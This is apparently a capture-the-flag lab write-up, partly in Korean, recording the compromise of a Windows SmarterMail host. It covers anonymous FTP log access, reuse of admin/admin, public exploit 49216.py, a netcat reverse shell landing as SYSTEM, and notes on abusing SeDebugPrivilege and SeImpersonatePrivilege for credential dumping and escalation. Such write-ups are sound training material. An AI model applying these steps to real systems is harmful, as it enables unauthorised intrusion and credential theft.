# 192.168.192.65

> nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65

![](https://github.com/user-attachments/assets/8379f885-95c8-42db-b41f-640a2a8ed33e)
┌──(root㉿docker-desktop)-[/]
└─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 13:52 +0000
Nmap scan report for 192.168.192.65
Host is up (0.12s latency).
Not shown: 47682 filtered tcp ports (no-response), 17843 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20 10:31PM <DIR> ImapRetrieval
| 01-06-25 04:54AM <DIR> Logs
| 04-29-20 10:31PM <DIR> PopRetrieval
|_04-29-20 10:32PM <DIR> Spool
| ftp-syst:
|_ SYST: Windows_NT
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
9998/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Tue, 06 Oct 2026 13:56:35 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
17001/tcp open remoting MS .NET Remoting services
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
| 3.1.1:
|_ Message signing enabled but not required
| smb2-time:
| date: 2026-10-06T13:56:40
|_ start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.58 seconds

> anonymous FTP test

┌──(root㉿docker-desktop)-[/]
└─# nc -v 192.168.192.65 21
192.168.192.65: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.192.65] 21 (ftp) open
220 Microsoft FTP Service

┌──(root㉿docker-desktop)-[/]
└─# wget -r ftp://Anonymous:pass@192.168.192.65
--2026-10-06 14:09:42-- ftp://Anonymous:_password_@192.168.192.65/
=> ‘192.168.192.65/.listing’
Connecting to 192.168.192.65:21... connected.
Logging in as Anonymous ... Logged in!
==> SYST ... done. ==> PWD ... done.
==> TYPE I ... done. ==> CWD not needed.
==> PASV ... done. ==> LIST ... done.

> ftp anonymous login success

┌──(root㉿docker-desktop)-[/]
└─# ftp 192.168.192.65
Connected to 192.168.192.65.
220 Microsoft FTP Service
Name (192.168.192.65:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>

> 일단 Logs 부터 확인

ftp> ls -al
229 Entering Extended Passive Mode (|||50029|)
125 Data connection already open; Transfer starting.
04-29-20 10:31PM <DIR> ImapRetrieval -> mail imap
01-06-25 04:54AM <DIR> Logs
04-29-20 10:31PM <DIR> PopRetrieval -> mail pop
04-29-20 10:32PM <DIR> Spool (임시 데이터 저장 영역 Queue)
226 Transfer complete.
ftp> cd Logs
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50030|)
150 Opening ASCII mode data connection.
04-29-20 11:26PM 582 2020.04.29-delivery.log
04-29-20 11:15PM 0 2020.04.29-profiler.log
04-29-20 11:26PM 208 2020.04.29-smtpLog.log
04-29-20 11:26PM 300 2020.04.29-xmppLog.log
05-12-20 03:36AM 504 2020.05.12-administrative.log
05-12-20 03:36AM 699 2020.05.12-delivery.log
05-12-20 02:06AM 0 2020.05.12-profiler.log
05-12-20 03:36AM 306 2020.05.12-smtpLog.log
05-12-20 03:36AM 444 2020.05.12-xmppLog.log
05-13-20 03:46AM 233 2020.05.13-delivery.log
05-13-20 03:47AM 0 2020.05.13-profiler.log
05-13-20 03:46AM 102 2020.05.13-smtpLog.log
05-13-20 03:46AM 148 2020.05.13-xmppLog.log
05-15-20 01:16AM 163 2020.05.15-delivery.log
05-15-20 01:16AM 0 2020.05.15-profiler.log
05-15-20 01:16AM 102 2020.05.15-smtpLog.log
05-15-20 01:16AM 148 2020.05.15-xmppLog.log
05-27-20 08:45PM 233 2020.05.27-delivery.log
05-27-20 08:45PM 0 2020.05.27-profiler.log
05-27-20 08:45PM 102 2020.05.27-smtpLog.log
05-27-20 08:45PM 148 2020.05.27-xmppLog.log
06-01-20 06:51PM 161 2020.06.01-delivery.log
06-01-20 06:51PM 0 2020.06.01-profiler.log
06-01-20 06:51PM 100 2020.06.01-smtpLog.log
06-01-20 06:51PM 146 2020.06.01-xmppLog.log
07-09-20 12:48PM 163 2020.07.09-delivery.log
07-09-20 12:48PM 0 2020.07.09-profiler.log
07-09-20 12:48PM 102 2020.07.09-smtpLog.log
07-09-20 12:48PM 148 2020.07.09-xmppLog.log
07-12-20 08:58AM 104 2020.07.12-delivery.log
07-12-20 08:58AM 0 2020.07.12-profiler.log
07-12-20 08:58AM 102 2020.07.12-smtpLog.log
07-12-20 08:58AM 148 2020.07.12-xmppLog.log
07-28-20 05:00AM 163 2020.07.28-delivery.log
07-28-20 05:00AM 0 2020.07.28-profiler.log
07-28-20 05:00AM 102 2020.07.28-smtpLog.log
07-28-20 05:00AM 148 2020.07.28-xmppLog.log
12-02-21 08:29AM 233 2021.12.02-delivery.log
12-02-21 08:27AM 358 2021.12.02-imapLog.log
12-02-21 08:27AM 358 2021.12.02-popLog.log
12-02-21 08:29AM 0 2021.12.02-profiler.log
12-02-21 08:29AM 460 2021.12.02-smtpLog.log
12-02-21 08:29AM 553 2021.12.02-xmppLog.log
04-04-22 09:29AM 231 2022.04.04-delivery.log
04-04-22 09:23AM 358 2022.04.04-imapLog.log
04-04-22 09:23AM 358 2022.04.04-popLog.log
04-04-22 09:29AM 0 2022.04.04-profiler.log
04-04-22 09:29AM 458 2022.04.04-smtpLog.log
04-04-22 09:29AM 551 2022.04.04-xmppLog.log
05-02-22 07:55AM 1027 2022.05.02-delivery.log
05-02-22 07:51AM 1790 2022.05.02-imapLog.log
05-02-22 07:51AM 1790 2022.05.02-popLog.log
05-02-22 06:35AM 0 2022.05.02-profiler.log
05-02-22 07:55AM 2240 2022.05.02-smtpLog.log
05-02-22 07:55AM 2659 2022.05.02-xmppLog.log
10-06-26 06:27AM 285 2025.01.06-delivery.log
01-06-25 04:54AM 358 2025.01.06-imapLog.log
01-06-25 04:54AM 358 2025.01.06-popLog.log
01-06-25 04:54AM 408 2025.01.06-smtpLog.log
01-06-25 04:54AM 455 2025.01.06-xmppLog.log
226 Transfer complete.
ftp> cat 2020.05.12-administrative.log
?Invalid command.
ftp> get 2020.05.12-administrative.log
local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
229 Entering Extended Passive Mode (|||50031|)
125 Data connection already open; Transfer starting.
100% || 504 2.98 KiB/s 00:00 ETA
226 Transfer complete.
504 bytes received in 00:00 (2.98 KiB/s)

┌──(root㉿docker-desktop)-[/]
└─# cat 2020.05.12-administrative.log
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out

> admin/admin found

![](https://github.com/user-attachments/assets/bfa1a0b7-486c-416a-afa3-5d422544ef02)

> http://192.168.192.65:9998/interface/root#/login

![](https://github.com/user-attachments/assets/14d03ad6-4c1e-4214-80db-b4fa4f0979b2)

- SmarterMail found
- search exploit with Smartermail keyword

apt install exploitdb
searchsploit -u
searchsploit smartermail

![](https://github.com/user-attachments/assets/0dcdc032-3031-4659-9c75-b19c203d9d9e)

Shellcodes: No Results

![](https://github.com/user-attachments/assets/22587368-ee3d-40d6-8628-13dffc9edae7)

┌──(root㉿docker-desktop)-[/]
└─# http http://192.168.192.65:9998/interface/root#/login
HTTP/1.1 200 OK
Cache-Control: private
Content-Encoding: gzip
Content-Length: 2420
Content-Type: text/html; charset=utf-8
Date: Tue, 06 Oct 2026 13:56:24 GMT
Server: Microsoft-IIS/10.0
Vary: Accept-Encoding
X-AspNetMvc-Version: 5.2

┌──(root㉿docker-desktop)-[/]
└─# curl -s http://192.168.192.65:9998/interface/login | grep -i "version\|build\|smartermail"

apt install whatweb
whatweb http://192.168.192.65:9998

┌──(root㉿docker-desktop)-[/]
└─# whatweb http://192.168.192.65:9998
http://192.168.192.65:9998 [302 Found] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.192.65], Microsoft-IIS[10.0], RedirectLocation[/interface/root], Title[Object moved], UncommonHeaders[x-aspnetmvc-version]
http://192.168.192.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.192.65], Microsoft-IIS[10.0], Script, UncommonHeaders[x-aspnetmvc-version], X-UA-Compatible[IE=edge]

apt install nikto
nikto -h http://192.168.192.65:9998
![](https://github.com/user-attachments/assets/26fa0595-b6bf-4b4d-b15c-5686b83eb02b)

> Since the version is hard to find, let's just proceed in the order of most likely candidates

searchsploit smartermail

┌──(root㉿docker-desktop)-[~]
└─# find / -name "49216.py" 2>/dev/null
/usr/share/exploitdb/exploits/windows/remote/49216.py
/root/49216.py

ipconfig -> 192.168.45.194 (local)
![](https://github.com/user-attachments/assets/6ad29a08-a843-40b7-9274-bbdb36d5936d)

vim 49216.py

hostname -I
apt install iproute2
ip a

- 윈도우 환경에서 openvpn 이라 ipconfig 로 확인해야 함... docker에서 확인하면 안 보임
- 그냥 호스트 vpn 끊고 도커에서 vpn 직접 연결함

┌──(root㉿docker-desktop)-[~]
└─# python3 49216.py
Traceback (most recent call last):
File "/root/49216.py", line 38, in <module>
s.connect((HOST,PORT))

```^^^^^^^^^^^^^
ConnectionRefusedError: [Errno 111] Connection refused


- 통신 확인
nc -vz -w 3 192.168.192.65 17001


> ![](https://github.com/user-attachments/assets/9ab5eed7-4efb-47cf-9d1c-f9e637a75210)
```

- tun0 vpn연결 확인 -> LHOST
  - ![](https://github.com/user-attachments/assets/5b0e7240-4f81-47d8-98d4-d0e1e392a775)

- 리스닝 열기
  nc -lnvp 4444

- 리버싱 실시
  - python3 49216.py

- 리버싱 연결 완료
  - ![](https://github.com/user-attachments/assets/9e1ca24b-a210-49ff-aa05-d75b5a9fb0c6)

- 쉘 버전 확인
  - 파워쉘 확인
    PS C:\Windows\$PSVersionTable

Name Value

---

PSVersion 5.1.18362.752
PSEdition Desktop
PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
BuildVersion 10.0.18362.752
CLRVersion 4.0.30319.42000
WSManStackVersion 3.0
PSRemotingProtocolVersion 2.3
SerializationVersion 1.1.0.1

- 플래그 확인
  PS C:\Windows\system32> Get-ChildItem -Recurse -Filter _flag_ -ErrorAction SilentlyContinue
  PS C:\Windows\system32>

┌──(root㉿docker-desktop)-[/]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.194] from (UNKNOWN) [192.168.192.65] 49996
ls -Filter _Flag_
PS C:\Windows\system32> ls -Filter _FLAG_
PS C:\Windows\system32>

whoami
nt authority\system

Get-ChildItem -File
Get-ChildItem -Directory

PS C:\> Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Select-String "FLAG"

- 권한 확인
  whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name Description State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
SeLockMemoryPrivilege Lock pages in memory Enabled
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
SeTcbPrivilege Act as part of the operating system Enabled
SeSecurityPrivilege Manage auditing and security log Disabled
SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled
SeLoadDriverPrivilege Load and unload device drivers Disabled
SeSystemProfilePrivilege Profile system performance Enabled
SeSystemtimePrivilege Change the system time Disabled
SeProfileSingleProcessPrivilege Profile single process Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled
SeCreatePagefilePrivilege Create a pagefile Enabled
SeCreatePermanentPrivilege Create permanent shared objects Enabled
SeBackupPrivilege Back up files and directories Disabled
SeRestorePrivilege Restore files and directories Disabled
SeShutdownPrivilege Shut down the system Disabled
SeDebugPrivilege Debug programs Enabled
SeAuditPrivilege Generate security audits Enabled
SeSystemEnvironmentPrivilege Modify firmware environment values Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeManageVolumePrivilege Perform volume maintenance tasks Disabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
SeTimeZonePrivilege Change the time zone Enabled
SeCreateSymbolicLinkPrivilege Create symbolic links Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
PS C:\Windows\system32>

- 레버리지(Leverage)가 가장 높은 핵심 특권

## 1. 최우선 공략 대상 특권

- `SeDebugPrivilege` (Enabled)
- 위험도: 최상
- 활용 방법: 프로세스 메모리를 읽고 쓸 수 있으며 다른 프로세스에 디버거를 붙일 수 있습니다. 시스템(SYSTEM) 권한으로 실행 중인 프로세스(예: `lsass.exe`, `winlogon.exe`)에 접근하여 프로세스 토큰을 탈취하거나 자격 증명을 덤프(Dump)하는 데 즉시 사용합니다.

- `SeImpersonatePrivilege` (Enabled)
- 위험도: 최상
- 활용 방법: 서비스 계정(Network Service, Local Service 등)으로 진입했을 때 가장 강력한 무기입니다. Potato 계열 취약점(Juicy Potato, Rogue Potato 등)이나 Named Pipe 기반의 가장(Impersonation) 공격을 통해 SYSTEM 권한으로 즉시 수직 권한 상승(Privilege Escalation)을 달성할 수 있습니다.

- `SeTcbPrivilege` (Enabled)
- 위험도: 최상
- 활용 방법: 운영체제의 핵심 구성 요소처럼 동작하므로, 임의의 사용자나 프로세스의 토큰을 완전히 가장하여 사실상 시스템의 마스터 권한을 획득할 수 있습니다.

---

## 2. 공략 우선순위 요약

1. `SeImpersonatePrivilege` 확인: 현재 계정이 일반 서비스 계정이라면 가장 먼저 Potato 계열 공격 벡터를 테스트하여 SYSTEM 권한 상승을 시도합니다.
2. `SeDebugPrivilege` 활용: 이미 어느 정도 권한이 있거나 위 과정이 막혔을 때, 디버그 권한을 이용해 메모리에서 자격 증명을 탈취하거나 토큰을 조작합니다.

## 다음 시도

Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object Name -match 'flag|proof|local'

┌──(root㉿docker-desktop)-[~]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.194] from (UNKNOWN) [192.168.192.65] 49694
Get-ChildItem -Path C:\ -Recurse -Filter _flag_,_local.txt_,_proof.txt_
PS C:\Windows\system32> Get-ChildItem -Path C:\Users _recurse -File -ErrorAction SilentlyCOntinue | Where-Object Name -match 'flag|proof|local'
PS C:\Windows\system32>

- No results found

findstr /s /i "flag" C:\*.txt 2>nul

- No results found

Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue

    Directory: C:\Windows\System32\Desktop

Mode LastWriteTime Length Name

---

-a---- 10/13/2026 10:38 PM 34 proof.txt

---

d-r--- 4/24/2020 3:44 AM Desktop

- FLAG found
  ![](https://github.com/user-attachments/assets/d2431b32-059b-4bde-b6cd-0ac81d2ffd40)

Get-Content : Cannot find path 'C:\Users\Administrator\Desktop\proof.txt' because it does not exist.
At line:1 char:1

- Get-Content C:\Users\Administrator\Desktop\proof.txt 2>&1
- ```
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\proof.txt:String) [Get-Content], ItemNot
   FoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
  ```

Get-Content C:\Windows\System32\Desktop\proof.txt

FLAG
